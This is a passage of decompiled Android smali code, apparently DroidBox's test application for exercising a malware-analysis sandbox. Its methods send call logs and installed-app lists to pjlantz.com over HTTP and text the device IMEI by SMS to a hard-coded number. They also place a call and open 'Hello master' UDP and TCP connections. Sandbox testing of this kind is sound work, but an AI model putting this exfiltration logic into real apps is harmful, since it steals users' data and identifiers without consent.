    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_0

    .line 522
    .end local v4           #url:Ljava/net/URL;
    .restart local v5       #url:Ljava/net/URL;
    :try_start_5
    #v5=(Reference);
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    move-object v0, v7

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v6, v0

    .line 523
    new-instance v3, Ljava/io/BufferedReader;

    .end local v3           #rd:Ljava/io/BufferedReader;
    #v3=(UninitRef);
    new-instance v7, Ljava/io/InputStreamReader;

    #v7=(UninitRef);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    #v7=(Reference);
    invoke-direct {v3, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 524
    .restart local v3       #rd:Ljava/io/BufferedReader;
    :cond_4
    #v3=(Reference);
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_4

    .line 525
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 526
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 529
    new-instance v4, Ljava/net/URL;

    #v4=(UninitRef);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef);
    const-string v8, "http://pjlantz.com/call.php?logs="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v7=(Reference);
    iget-object v8, p0, Ldroidbox/tests/DroidBoxTests;->calls:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "+"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v4, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_1
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_1

    .line 530
    .end local v5           #url:Ljava/net/URL;
    .restart local v4       #url:Ljava/net/URL;
    :try_start_6
    #v4=(Reference);
    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    move-object v0, v7

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v6, v0

    .line 531
    new-instance v3, Ljava/io/BufferedReader;

    .end local v3           #rd:Ljava/io/BufferedReader;
    #v3=(UninitRef);
    new-instance v7, Ljava/io/InputStreamReader;

    #v7=(UninitRef);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    #v7=(Reference);
    invoke-direct {v3, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 532
    .restart local v3       #rd:Ljava/io/BufferedReader;
    :cond_5
    #v3=(Reference);
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_5

    .line 533
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 534
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 537
    new-instance v5, Ljava/net/URL;

    #v5=(UninitRef);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef);
    const-string v8, "http://pjlantz.com/app.php?installed="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v7=(Reference);
    iget-object v8, p0, Ldroidbox/tests/DroidBoxTests;->installedApps:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "+"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_0

    .line 538
    .end local v4           #url:Ljava/net/URL;
    .restart local v5       #url:Ljava/net/URL;
    :try_start_7
    #v5=(Reference);
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    move-object v0, v7

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v6, v0

    .line 539
    new-instance v3, Ljava/io/BufferedReader;

    .end local v3           #rd:Ljava/io/BufferedReader;
    #v3=(UninitRef);
    new-instance v7, Ljava/io/InputStreamReader;

    #v7=(UninitRef);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    #v7=(Reference);
    invoke-direct {v3, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 540
    .restart local v3       #rd:Ljava/io/BufferedReader;
    :cond_6
    #v3=(Reference);
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_6

    .line 541
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 542
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_1
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_1

    .line 546
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    move-object v4, v5

    .line 548
    .end local v2           #line:Ljava/lang/String;
    .end local v3           #rd:Ljava/io/BufferedReader;
    .end local v5           #url:Ljava/net/URL;
    .restart local v4       #url:Ljava/net/URL;
    :goto_0
    #v0=(Conflicted);v1=(Conflicted);v2=(Conflicted);v3=(Conflicted);v5=(Conflicted);v9=(Conflicted);v10=(Conflicted);
    return-void

    .line 543
    :catch_0
    #v1=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v1, v7

    .line 544
    .local v1, e:Ljava/io/IOException;
    :goto_1
    :try_start_8
    #v1=(Reference);
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 546
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_0

    .line 545
    .end local v1           #e:Ljava/io/IOException;
    :catchall_0
    #v1=(Conflicted);v7=(Conflicted);
    move-exception v7

    .line 546
    :goto_2
    #v7=(Reference);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 547
    throw v7

    .line 545
    .end local v4           #url:Ljava/net/URL;
    .restart local v5       #url:Ljava/net/URL;
    :catchall_1
    #v1=(Uninit);v4=(Conflicted);v5=(Reference);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v5

    .end local v5           #url:Ljava/net/URL;
    .restart local v4       #url:Ljava/net/URL;
    #v4=(Reference);
    goto :goto_2

    .line 543
    .end local v4           #url:Ljava/net/URL;
    .restart local v5       #url:Ljava/net/URL;
    :catch_1
    #v4=(Conflicted);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v1, v7

    #v1=(Reference);
    move-object v4, v5

    .end local v5           #url:Ljava/net/URL;
    .restart local v4       #url:Ljava/net/URL;
    #v4=(Reference);
    goto :goto_1
.end method

.method public testPhoneCall()V
    .locals 3

    .prologue
    .line 314
    const-string v1, "Test"

    #v1=(Reference);
    const-string v2, "[*] testPhoneCall()"

    #v2=(Reference);
    invoke-static {v1, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 315
    new-instance v0, Landroid/content/Intent;

    #v0=(UninitRef);
    const-string v1, "android.intent.action.CALL"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 316
    .local v0, callIntent:Landroid/content/Intent;
    #v0=(Reference);
    const-string v1, "tel:123456789"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 317
    invoke-virtual {p0, v0}, Ldroidbox/tests/DroidBoxTests;->startActivity(Landroid/content/Intent;)V

    .line 318
    return-void
.end method

.method public testReadFile()V
    .locals 7

    .prologue
    .line 276
    const-string v5, "Test"

    #v5=(Reference);
    const-string v6, "[*] testReadFile()"

    #v6=(Reference);
    invoke-static {v5, v6}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 278
    :try_start_0
    const-string v5, "myfilename.txt"

    invoke-virtual {p0, v5}, Ldroidbox/tests/DroidBoxTests;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v3

    .line 279
    .local v3, instream:Ljava/io/InputStream;
    #v3=(Reference);
    if-eqz v3, :cond_0

    .line 280
    new-instance v2, Ljava/io/InputStreamReader;

    #v2=(UninitRef);
    invoke-direct {v2, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 281
    .local v2, inputreader:Ljava/io/InputStreamReader;
    #v2=(Reference);
    new-instance v0, Ljava/io/BufferedReader;

    #v0=(UninitRef);
    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 284
    .local v0, buffreader:Ljava/io/BufferedReader;
    :goto_0
    #v0=(Reference);v4=(Conflicted);
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    .local v4, line:Ljava/lang/String;
    #v4=(Reference);
    if-nez v4, :cond_2

    .line 288
    .end local v0           #buffreader:Ljava/io/BufferedReader;
    .end local v2           #inputreader:Ljava/io/InputStreamReader;
    .end local v4           #line:Ljava/lang/String;
    :cond_0
    #v0=(Conflicted);v2=(Conflicted);v4=(Conflicted);
    const-string v5, "FileContent"

    iget-object v6, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;

    invoke-static {v5, v6}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 289
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 292
    const-string v5, "output.txt"

    invoke-virtual {p0, v5}, Ldroidbox/tests/DroidBoxTests;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v3

    .line 293
    if-eqz v3, :cond_1

    .line 294
    new-instance v2, Ljava/io/InputStreamReader;

    #v2=(UninitRef);
    invoke-direct {v2, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 295
    .restart local v2       #inputreader:Ljava/io/InputStreamReader;
    #v2=(Reference);
    new-instance v0, Ljava/io/BufferedReader;

    #v0=(UninitRef);
    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 297
    .restart local v0       #buffreader:Ljava/io/BufferedReader;
    #v0=(Reference);
    iget-object v5, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    #v6=(UninitRef);
    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v6, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v6=(Reference);
    const-string v5, "&"

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;

    .line 298
    :goto_1
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    .restart local v4       #line:Ljava/lang/String;
    #v4=(Reference);
    if-nez v4, :cond_3

    .line 302
    .end local v0           #buffreader:Ljava/io/BufferedReader;
    .end local v2           #inputreader:Ljava/io/InputStreamReader;
    .end local v4           #line:Ljava/lang/String;
    :cond_1
    #v0=(Conflicted);v2=(Conflicted);v4=(Conflicted);
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 308
    .end local v3           #instream:Ljava/io/InputStream;
    :goto_2
    #v1=(Conflicted);v3=(Conflicted);v6=(Conflicted);
    return-void

    .line 285
    .restart local v0       #buffreader:Ljava/io/BufferedReader;
    .restart local v2       #inputreader:Ljava/io/InputStreamReader;
    .restart local v3       #instream:Ljava/io/InputStream;
    .restart local v4       #line:Ljava/lang/String;
    :cond_2
    #v0=(Reference);v1=(Uninit);v2=(Reference);v3=(Reference);v4=(Reference);v6=(Reference);
    iget-object v5, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    #v6=(UninitRef);
    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v6, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v6=(Reference);
    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 303
    .end local v0           #buffreader:Ljava/io/BufferedReader;
    .end local v2           #inputreader:Ljava/io/InputStreamReader;
    .end local v3           #instream:Ljava/io/InputStream;
    .end local v4           #line:Ljava/lang/String;
    :catch_0
    #v0=(Conflicted);v2=(Conflicted);v3=(Conflicted);v4=(Conflicted);v6=(Conflicted);
    move-exception v5

    move-object v1, v5

    .line 304
    .local v1, e:Ljava/io/FileNotFoundException;
    #v1=(Reference);
    invoke-virtual {v1}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_2

    .line 299
    .end local v1           #e:Ljava/io/FileNotFoundException;
    .restart local v0       #buffreader:Ljava/io/BufferedReader;
    .restart local v2       #inputreader:Ljava/io/InputStreamReader;
    .restart local v3       #instream:Ljava/io/InputStream;
    .restart local v4       #line:Ljava/lang/String;
    :cond_3
    :try_start_1
    #v0=(Reference);v1=(Uninit);v2=(Reference);v3=(Reference);v4=(Reference);v6=(Reference);
    iget-object v5, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    #v6=(UninitRef);
    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v6, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v6=(Reference);
    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;
    :try_end_1
    .catch Ljava/io/FileNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    .line 305
    .end local v0           #buffreader:Ljava/io/BufferedReader;
    .end local v2           #inputreader:Ljava/io/InputStreamReader;
    .end local v3           #instream:Ljava/io/InputStream;
    .end local v4           #line:Ljava/lang/String;
    :catch_1
    #v0=(Conflicted);v2=(Conflicted);v3=(Conflicted);v4=(Conflicted);v6=(Conflicted);
    move-exception v5

    move-object v1, v5

    .line 306
    .local v1, e:Ljava/io/IOException;
    #v1=(Reference);
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method

.method public testSendDatagram()V
    .locals 9

    .prologue
    .line 429
    const-string v7, "Test"

    #v7=(Reference);
    const-string v8, "[*] testSendDatagram()"

    #v8=(Reference);
    invoke-static {v7, v8}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 432
    :try_start_0
    const-string v7, "pjlantz.com"

    invoke-static {v7}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v5

    .line 433
    .local v5, serverAddr:Ljava/net/InetAddress;
    #v5=(Reference);
    new-instance v6, Ljava/net/DatagramSocket;

    #v6=(UninitRef);
    invoke-direct {v6}, Ljava/net/DatagramSocket;-><init>()V

    .line 434
    .local v6, socketUdp:Ljava/net/DatagramSocket;
    #v6=(Reference);
    const-string v7, "Hello master via UDP"

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    .line 435
    .local v0, buf:[B
    #v0=(Reference);
    new-instance v3, Ljava/net/DatagramPacket;

    #v3=(UninitRef);
    array-length v7, v0

    #v7=(Integer);
    const v8, 0xc35a

    #v8=(Char);
    invoke-direct {v3, v0, v7, v5, v8}, Ljava/net/DatagramPacket;-><init>([BILjava/net/InetAddress;I)V

    .line 436
    .local v3, packet:Ljava/net/DatagramPacket;
    #v3=(Reference);
    invoke-virtual {v6, v3}, Ljava/net/DatagramSocket;->send(Ljava/net/DatagramPacket;)V

    .line 437
    const/16 v7, 0x400

    #v7=(PosShort);
    new-array v2, v7, [B

    .line 438
    .local v2, message:[B
    #v2=(Reference);
    new-instance v4, Ljava/net/DatagramPacket;

    #v4=(UninitRef);
    array-length v7, v2

    #v7=(Integer);
    invoke-direct {v4, v2, v7}, Ljava/net/DatagramPacket;-><init>([BI)V

    .line 439
    .local v4, recv:Ljava/net/DatagramPacket;
    #v4=(Reference);
    invoke-virtual {v6, v4}, Ljava/net/DatagramSocket;->receive(Ljava/net/DatagramPacket;)V

    .line 440
    invoke-virtual {v6}, Ljava/net/DatagramSocket;->close()V
    :try_end_0
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 451
    .end local v0           #buf:[B
    .end local v2           #message:[B
    .end local v3           #packet:Ljava/net/DatagramPacket;
    .end local v4           #recv:Ljava/net/DatagramPacket;
    .end local v5           #serverAddr:Ljava/net/InetAddress;
    .end local v6           #socketUdp:Ljava/net/DatagramSocket;
    :goto_0
    #v0=(Conflicted);v1=(Conflicted);v2=(Conflicted);v3=(Conflicted);v4=(Conflicted);v5=(Conflicted);v6=(Conflicted);v7=(Conflicted);v8=(Conflicted);
    return-void

    .line 441
    :catch_0
    #v1=(Uninit);
    move-exception v7

    #v7=(Reference);
    move-object v1, v7

    .line 443
    .local v1, e:Ljava/net/UnknownHostException;
    #v1=(Reference);
    invoke-virtual {v1}, Ljava/net/UnknownHostException;->printStackTrace()V

    goto :goto_0

    .line 444
    .end local v1           #e:Ljava/net/UnknownHostException;
    :catch_1
    #v1=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v1, v7

    .line 446
    .local v1, e:Ljava/net/SocketException;
    #v1=(Reference);
    invoke-virtual {v1}, Ljava/net/SocketException;->printStackTrace()V

    goto :goto_0

    .line 447
    .end local v1           #e:Ljava/net/SocketException;
    :catch_2
    #v1=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v1, v7

    .line 449
    .local v1, e:Ljava/io/IOException;
    #v1=(Reference);
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method public testSendSMS()V
    .locals 6

    .prologue
    const/4 v2, 0x0

    .line 324
    #v2=(Null);
    const-string v1, "Test"

    #v1=(Reference);
    const-string v3, "[*] testSendSMS()"

    #v3=(Reference);
    invoke-static {v1, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 325
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 326
    .local v0, sms:Landroid/telephony/SmsManager;
    #v0=(Reference);
    const-string v1, "0735445281"

    const-string v3, "Sending sms..."

    move-object v4, v2

    #v4=(Null);
    move-object v5, v2

    #v5=(Null);
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 329
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 330
    const-string v1, "0735445281"

    iget-object v3, p0, Ldroidbox/tests/DroidBoxTests;->imei:Ljava/lang/String;

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 331
    return-void
.end method

.method public testSendSocket()V
    .locals 11

    .prologue
    .line 454
    const-string v9, "Test"

    #v9=(Reference);
    const-string v10, "[*] testSendSocket()"

    #v10=(Reference);
    invoke-static {v9, v10}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 455
    const/4 v5, 0x0

    .line 456
    .local v5, socket:Ljava/net/Socket;
    #v5=(Null);
    const/4 v2, 0x0

    .line 457
    .local v2, dataOutputStream:Ljava/io/DataOutputStream;
    #v2=(Null);
    const/4 v0, 0x0

    .line 458
    .local v0, dataInputStream:Ljava/io/DataInputStream;
    #v0=(Null);
    const-string v7, ""

    .line 459
    .local v7, textIn:Ljava/lang/String;
    #v7=(Reference);
    const-string v8, "Hello master via TCP"

    .line 461
    .local v8, textOut:Ljava/lang/String;
    :try_start_0
    #v8=(Reference);
    new-instance v6, Ljava/net/Socket;

    #v6=(UninitRef);
    const-string v9, "pjlantz.com"

    const v10, 0xc357

    #v10=(Char);
    invoke-direct {v6, v9, v10}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 462
    .end local v5           #socket:Ljava/net/Socket;
    .local v6, socket:Ljava/net/Socket;
    :try_start_1
    #v6=(Reference);
    new-instance v3, Ljava/io/DataOutputStream;

    #v3=(UninitRef);
    invoke-virtual {v6}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v9

    invoke-direct {v3, v9}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_1
    .catch Ljava/net/UnknownHostException; {:try_start_1 .. :try_end_1} :catch_5
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2

    .line 463
    .end local v2           #dataOutputStream:Ljava/io/DataOutputStream;
    .local v3, dataOutputStream:Ljava/io/DataOutputStream;
    :try_start_2
    #v3=(Reference);
    new-instance v1, Ljava/io/DataInputStream;

    #v1=(UninitRef);
    invoke-virtual {v6}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v9

    invoke-direct {v1, v9}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_2
    .catch Ljava/net/UnknownHostException; {:try_start_2 .. :try_end_2} :catch_6
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    .line 464
    .end local v0           #dataInputStream:Ljava/io/DataInputStream;
    .local v1, dataInputStream:Ljava/io/DataInputStream;
    :try_start_3
    #v1=(Reference);
    invoke-virtual {v3, v8}, Ljava/io/DataOutputStream;->writeUTF(Ljava/lang/String;)V

    .line 465
    invoke-virtual {v1}, Ljava/io/DataInputStream;->readUTF()Ljava/lang/String;

    move-result-object v7

    .line 466
    invoke-virtual {v6}, Ljava/net/Socket;->close()V
    :try_end_3
    .catch Ljava/net/UnknownHostException; {:try_start_3 .. :try_end_3} :catch_7
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4

    move-object v0, v1

    .end local v1           #dataInputStream:Ljava/io/DataInputStream;
    .restart local v0       #dataInputStream:Ljava/io/DataInputStream;
    #v0=(Reference);
    move-object v2, v3

    .end local v3           #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v2       #dataOutputStream:Ljava/io/DataOutputStream;
    #v2=(Reference);
    move-object v5, v6

    .line 474
    .end local v6           #socket:Ljava/net/Socket;
    .restart local v5       #socket:Ljava/net/Socket;
    :goto_0
    #v1=(Conflicted);v3=(Conflicted);v4=(Conflicted);v5=(Reference);v6=(Conflicted);v10=(Conflicted);
    return-void

    .line 467
    :catch_0
    #v0=(Null);v1=(Uninit);v2=(Null);v3=(Uninit);v4=(Uninit);v5=(Null);
    move-exception v9

    move-object v4, v9

    .line 469
    .local v4, e:Ljava/net/UnknownHostException;
    :goto_1
    #v0=(Reference);v1=(Conflicted);v2=(Reference);v3=(Conflicted);v4=(Reference);v5=(Reference);
    invoke-virtual {v4}, Ljava/net/UnknownHostException;->printStackTrace()V

    goto :goto_0

    .line 470
    .end local v4           #e:Ljava/net/UnknownHostException;
    :catch_1
    #v0=(Null);v1=(Uninit);v2=(Null);v3=(Uninit);v4=(Uninit);v5=(Null);
    move-exception v9

    move-object v4, v9

    .line 472
    .local v4, e:Ljava/io/IOException;
    :goto_2
    #v0=(Reference);v1=(Conflicted);v2=(Reference);v3=(Conflicted);v4=(Reference);v5=(Reference);
    invoke-virtual {v4}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 470
    .end local v4           #e:Ljava/io/IOException;
    .end local v5           #socket:Ljava/net/Socket;
    .restart local v6       #socket:Ljava/net/Socket;
    :catch_2
    #v0=(Null);v1=(Uninit);v2=(Null);v4=(Uninit);v5=(Null);v6=(Reference);v10=(Char);
    move-exception v9

    move-object v4, v9

    #v4=(Reference);
    move-object v5, v6

    .end local v6           #socket:Ljava/net/Socket;
    .restart local v5       #socket:Ljava/net/Socket;
    #v5=(Reference);
    goto :goto_2

    .end local v2           #dataOutputStream:Ljava/io/DataOutputStream;
    .end local v5           #socket:Ljava/net/Socket;
    .restart local v3       #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v6       #socket:Ljava/net/Socket;
    :catch_3
    #v1=(Conflicted);v3=(Reference);v4=(Uninit);v5=(Null);
    move-exception v9

    move-object v4, v9

    #v4=(Reference);
    move-object v2, v3

    .end local v3           #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v2       #dataOutputStream:Ljava/io/DataOutputStream;
    #v2=(Reference);
    move-object v5, v6

    .end local v6           #socket:Ljava/net/Socket;
    .restart local v5       #socket:Ljava/net/Socket;
    #v5=(Reference);
    goto :goto_2

    .end local v0           #dataInputStream:Ljava/io/DataInputStream;
    .end local v2           #dataOutputStream:Ljava/io/DataOutputStream;
    .end local v5           #socket:Ljava/net/Socket;
    .restart local v1       #dataInputStream:Ljava/io/DataInputStream;
    .restart local v3       #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v6       #socket:Ljava/net/Socket;
    :catch_4
    #v1=(Reference);v2=(Null);v4=(Uninit);v5=(Null);
    move-exception v9

    move-object v4, v9

    #v4=(Reference);
    move-object v0, v1

    .end local v1           #dataInputStream:Ljava/io/DataInputStream;
    .restart local v0       #dataInputStream:Ljava/io/DataInputStream;
    #v0=(Reference);
    move-object v2, v3

    .end local v3           #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v2       #dataOutputStream:Ljava/io/DataOutputStream;
    #v2=(Reference);
    move-object v5, v6

    .end local v6           #socket:Ljava/net/Socket;
    .restart local v5       #socket:Ljava/net/Socket;
    #v5=(Reference);
    goto :goto_2

    .line 467
    .end local v5           #socket:Ljava/net/Socket;
    .restart local v6       #socket:Ljava/net/Socket;
    :catch_5
    #v0=(Null);v1=(Uninit);v2=(Null);v3=(Conflicted);v4=(Uninit);v5=(Null);
    move-exception v9

    move-object v4, v9

    #v4=(Reference);
    move-object v5, v6

    .end local v6           #socket:Ljava/net/Socket;
    .restart local v5       #socket:Ljava/net/Socket;
